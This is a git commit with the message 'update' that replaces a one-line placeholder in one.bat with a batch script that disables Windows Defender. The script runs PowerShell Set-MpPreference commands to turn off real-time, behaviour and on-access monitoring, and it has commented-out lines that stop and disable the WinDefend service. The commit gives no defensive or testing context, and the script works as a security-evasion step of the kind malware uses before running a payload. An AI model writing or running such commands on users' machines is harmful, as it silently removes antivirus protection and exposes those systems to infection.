d43940bd178076dc9c33801b3ea0453cf5944fca
madmaxvoltro <altamaxime@gmail.com>
2024-09-18 15:17:30 +0200

    update

--- one.bat
+++ one.bat
@@ -1,1 +1,17 @@
-echo("test")
+@echo off
+:: Disable Windows Defender using PowerShell commands
+
+:: Run PowerShell command to disable real-time protection
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+
+:: Disable other Defender features
+powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
+powershell -Command "Set-MpPreference -DisableOnAccessProtection $true"
+powershell -Command "Set-MpPreference -DisableScanOnRealtimeEnable $true"
+
+:: Optional: Disable the Defender service (not recommended)
+:: sc stop WinDefend
+:: sc config WinDefend start=disabled
+
+echo Windows Defender has been disabled.
+pause
